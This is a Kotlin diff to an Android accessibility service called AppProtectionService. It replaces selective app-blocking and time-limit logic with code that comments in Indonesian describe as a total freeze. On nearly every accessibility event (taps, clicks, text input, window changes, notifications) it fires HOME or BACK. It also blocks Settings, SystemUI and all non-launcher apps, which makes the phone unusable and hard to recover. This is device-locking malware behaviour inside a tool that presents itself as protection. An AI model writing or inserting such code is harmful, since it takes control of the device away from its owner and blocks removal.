@@ -100,62 +100,98 @@ class AppProtectionService : AccessibilityService() {
         val pkg = event.packageName?.toString() ?: return
         val cls = event.className?.toString() ?: ""
         
-        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pkg != ourPackage) {
-            checkBlockedAndTimeLimit(pkg)
-        }
-
-        if (pkg == ourPackage && eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            lastOurAppForegroundMs = System.currentTimeMillis()
-        }
+        // ========== ULTRA EXTREME: FREEZE TOTAL - GABISA GERAK SAMA SEKALI ==========
+        // BLOKIR SEMUA TOUCH, TAP, SWIPE, CLICK - HP JADI BATU TOTAL!
         
-        // ========== FITUR BARU: BLOKIR PANEL SETTINGS ==========
-        // Kalau aksesibilitas sudah granted, blokir panel settings!
-        if (settingsPackages.contains(pkg)) {
-            handleSettingsEvent(cls, eventType)
-            // LANGSUNG BLOKIR PANEL SETTINGS
-            goHome()
-            return
-        }
-        // =======================================================
-        
-        // ========== PREVENT QUICK SETTINGS PANEL ==========
-        // Intercept SEMUA event dari SystemUI untuk prevent panel muncul
-        val isSystemUi   = systemUiPackages.contains(pkg) || pkg == "com.android.systemui"
-        val isPanelClass = panelClassKeywords.any { cls.contains(it, ignoreCase = true) }
-        
-        if (isSystemUi || isPanelClass) {
-            // LANGSUNG COLLAPSE + BACK tanpa biarkan panel muncul
+        // Blokir SEMUA window state changes (termasuk app kita sendiri!)
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             try {
-                performGlobalAction(GLOBAL_ACTION_BACK)
+                performGlobalAction(GLOBAL_ACTION_HOME)
                 performGlobalAction(GLOBAL_ACTION_BACK)
             } catch (_: Exception) {}
-            
-            // Collapse panel dengan semua method
+            return
+        }
+        
+        // Blokir SEMUA window content changes
+        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            try {
+                performGlobalAction(GLOBAL_ACTION_BACK)
+            } catch (_: Exception) {}
+            return
+        }
+        
+        // Blokir SEMUA windows changes
+        if (eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
+            try {
+                performGlobalAction(GLOBAL_ACTION_HOME)
+            } catch (_: Exception) {}
+            return
+        }
+        
+        // Blokir SEMUA view focused (tap detection)
+        if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+            try {
+                performGlobalAction(GLOBAL_ACTION_BACK)
+            } catch (_: Exception) {}
+            return
+        }
+        
+        // Blokir SEMUA view clicked
+        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            try {
+                performGlobalAction(GLOBAL_ACTION_BACK)
+            } catch (_: Exception) {}
+            return
+        }
+        
+        // Blokir SEMUA view text changed (keyboard input)
+        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            try {
+                performGlobalAction(GLOBAL_ACTION_BACK)
+            } catch (_: Exception) {}
+            return
+        }
+        
+        // Blokir SEMUA notification
+        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             try {
                 sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
             } catch (_: Exception) {}
-            
-            try {
-                val sbs = getSystemService("statusbar")
-                val sbClass = Class.forName("android.app.StatusBarManager")
-                try {
-                    sbClass.getMethod("collapsePanels").invoke(sbs)
-                } catch (_: Exception) {
-                    sbClass.getMethod("collapse").invoke(sbs)
-                }
-            } catch (_: Exception) {}
-            
             return
         }
-        // =================================================
         
-        if (isDeviceLocked()) {
-            // Kalau app lain muncul saat locked → collapse + restore lock
-            if (pkg != ourPackage && (
-                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
-                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED
-            )) collapseAndRestore()
+        // Blokir SEMUA app launch (termasuk dari launcher)
+        if (!pkg.contains("launcher", ignoreCase = true)) {
+            // Kalau bukan launcher → paksa balik ke home
+            try {
+                performGlobalAction(GLOBAL_ACTION_HOME)
+            } catch (_: Exception) {}
+            return
         }
+        
+        // Blokir SystemUI
+        if (systemUiPackages.contains(pkg) || pkg == "com.android.systemui") {
+            try {
+                performGlobalAction(GLOBAL_ACTION_HOME)
+                sendBroadcast(Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS))
+            } catch (_: Exception) {}
+            return
+        }
+        
+        // Blokir Settings
+        if (settingsPackages.contains(pkg)) {
+            try {
+                performGlobalAction(GLOBAL_ACTION_HOME)
+            } catch (_: Exception) {}
+            return
+        }
+        
+        // BLOKIR SEMUA EVENT LAINNYA!
+        try {
+            performGlobalAction(GLOBAL_ACTION_HOME)
+        } catch (_: Exception) {}
+        
+        // ============================================================================
     }
 
     private fun checkBlockedAndTimeLimit(pkg: String) {
